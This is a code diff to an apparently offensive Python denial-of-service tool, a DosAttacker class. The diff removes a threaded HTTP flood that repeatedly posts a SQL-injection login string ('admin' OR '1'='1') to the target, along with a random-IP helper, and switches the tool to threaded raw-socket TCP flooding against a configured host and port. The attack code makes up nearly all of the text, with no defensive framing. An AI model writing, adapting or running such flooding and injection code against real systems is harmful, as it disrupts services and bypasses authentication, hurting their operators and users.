@@ -15,26 +15,6 @@ class DosAttacker:
         self.duration = duration
         self.stop_attack = False
 
-    def http_flooding(self):
-        end_time = time.time() + self.duration
-        while time.time() < end_time and not self.stop_attack:
-            target_url = f"http://{self.target}/"
-            try:
-                response = requests.post(
-                    target_url,
-                    data={"username": "admin' OR '1'='1", "password": "password"},
-                    timeout=2
-                )
-                print(f"HTTP Request sent to {target_url} - Status: {response.status_code}")
-            except requests.RequestException as e:
-                print(f"HTTP Request failed: {str(e)}")
-            except Exception as e:
-                print(f"Unexpected error in HTTP flood: {str(e)}")
-            time.sleep(0.1)
-
-    def generate_random_ip(self) -> str:
-        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-
     def tcp_flood(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -57,15 +37,7 @@ class DosAttacker:
 
     def start_attack(self, attack_type: str = "both"):
         threads = []
-        if attack_type.lower() in ["http", "both"]:
-            # Start HTTP flood threads
-            for _ in range(self.num_threads):
-                t = threading.Thread(target=self.http_flooding)
-                t.daemon = True
-                threads.append(t)
-                t.start()
-                print(f"Started HTTP flood thread {_+1}")
-        if attack_type.lower() in ["tcp", "both"]:
+        if attack_type.lower() in ["tcp"]:
             # Start TCP flood threads
             for _ in range(self.num_threads):
                 t = threading.Thread(target=self.tcp_flood)
@@ -100,8 +72,8 @@ if __name__ == "__main__":
             num_threads=THREAD_COUNT,
             duration=DURATION
         )
-        print(f"Starting DoS attack against {TARGET_HOST}")
-        attacker.start_attack(attack_type="both")
+        print(f"Starting DoS attack against {TARGET_HOST}:{TARGET_PORT}")
+        attacker.start_attack(attack_type="tcp")
         
     except KeyboardInterrupt:
         print("\nAttack stopped by user")
